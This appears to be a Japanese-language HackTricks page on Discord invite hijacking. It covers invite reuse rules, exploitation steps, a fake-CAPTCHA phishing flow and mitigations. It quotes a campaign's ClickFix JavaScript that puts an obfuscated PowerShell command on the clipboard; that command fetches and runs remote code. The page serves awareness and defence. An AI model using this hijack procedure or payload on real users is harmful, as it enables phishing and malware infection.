# Discord Invite Hijacking

{{#include ../../banners/hacktricks-training.md}}

Discord invite hijacking は、custom vanity link の再利用ルールを悪用します。期限切れの temporary invite code、または小文字と数字だけで構成された削除済みの permanent code は、Level 3 Boost された server 上で vanity link として登録できる場合があります。元の server が Level 3 Boost を失った場合も、custom vanity link が利用可能になることがあります。大文字を含む temporary invite では、通常の invite が有効な間に攻撃者が小文字形式の vanity を事前登録できますが、redirect が開始されるのはその invite の期限切れ後です。<sup>[[1]](#references)[[2]](#references)</sup>

## Invite Types and Hijack Risk

確認されているリスクは invite の種類によって異なります。<sup>[[1]](#references)[[2]](#references)</sup>

| Invite Type           | Hijackable? | Condition / Comments                                                                                       |
|-----------------------|-------------|------------------------------------------------------------------------------------------------------------|
| Temporary Invite Link | ✅          | 期限切れ後、code が利用可能になり、boosted server によって vanity URL として再登録できます。 |
| Permanent Invite Link | ⚠️          | 削除され、かつ小文字と数字のみで構成されている場合、code が再び利用可能になることがあります。        |
| Custom Vanity Link    | ✅          | 元の server が Level 3 Boost を失うと、その vanity invite が新規登録用に利用可能になります。    |

## Exploitation Steps

1. Reconnaissance
- 公開情報源（forums、social media、Telegram channels）で、`discord.gg/{code}` または `discord.com/invite/{code}` のパターンに一致する invite link を監視します。<sup>[[1]](#references)</sup>
- 関心のある invite code（temporary または vanity）を収集します。<sup>[[1]](#references)</sup>
2. Pre-registration
- Level 3 Boost 権限を持つ Discord server を作成するか、既存のものを使用します。<sup>[[1]](#references)[[2]](#references)</sup>
- **Server Settings → Vanity URL** で、対象の invite code の割り当てを試みます。受け入れられた場合、その code は malicious server によって予約されます。<sup>[[1]](#references)</sup>
3. Hijack Activation
- temporary invite の場合、元の invite が期限切れになるまで待ちます（または、source を管理している場合は手動で削除します）。<sup>[[1]](#references)</sup>
- 大文字を含む code では、小文字の variant をすぐに取得できますが、redirect が有効になるのは期限切れ後です。<sup>[[1]](#references)</sup>
4. Silent Redirection
- hijack が有効になると、古い link にアクセスしたユーザーはシームレスに攻撃者が管理する server へ送られます。<sup>[[1]](#references)</sup>

## Phishing Flow via Discord Server

1. server の channels を制限し、**#verify** channel だけが表示されるようにします。<sup>[[1]](#references)</sup>
2. bot（例: **Safeguard#0786**）を導入し、新規ユーザーに OAuth2 による verification を促します。<sup>[[1]](#references)</sup>
3. bot は、CAPTCHA または verification step を装って、ユーザーを phishing site（例: `captchaguard.me`）へ redirect します。<sup>[[1]](#references)</sup>
4. **ClickFix** UX trick を実装します。<sup>[[1]](#references)</sup>
- 壊れた CAPTCHA message を表示します。
- **Win+R** dialog を開き、あらかじめ用意された PowerShell command を貼り付けて Enter を押すようユーザーを誘導します。

### ClickFix Clipboard Injection Example

campaign では、悪意のある PowerShell command を clipboard にコピーするために JavaScript が使用されました。<sup>[[1]](#references)</sup>
```javascript
// Copy malicious PowerShell command to clipboard
const cmd = `powershell -NoExit -Command "$r='NJjeywEMXp3L3Fmcv02bj5ibpJWZ0NXYw9yL6MHc0RHa';` +
`$u=($r[-1..-($r.Length)]-join '');` +
`$url=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($u));` +
`iex (iwr -Uri $url)"`;
navigator.clipboard.writeText(cmd);
```
この手法は、ファイルを直接ダウンロードさせることを避け、ユーザーに馴染みのある UI 要素を利用して警戒心を下げます。<sup>[[1]](#references)</sup>

## Mitigations

- 永続的な invite link を優先し、code に少なくとも 1 つの uppercase letter が含まれていることを確認します。uppercase letters を含む削除済みの永続的な code は、vanity links として再利用できません。<sup>[[1]](#references)</sup>
- invite code を定期的に rotation し、古い links を revoke します。
- Discord server の boost status と vanity URL の claims を監視します。<sup>[[1]](#references)[[2]](#references)</sup>
- server の authenticity を確認し、clipboard から paste した commands を実行しないようユーザーを教育します。

## References

- [1] [信頼から脅威へ：Hijacked Discord Invites が Multi-Stage Malware Delivery に悪用される](https://research.checkpoint.com/2025/from-trust-to-threat-hijacked-discord-invites-used-for-multi-stage-malware-delivery/)
- [2] [Custom Invite Link – Discord Support](https://support.discord.com/hc/en-us/articles/115001542132-Custom-Invite-Link)
{{#include ../../banners/hacktricks-training.md}}
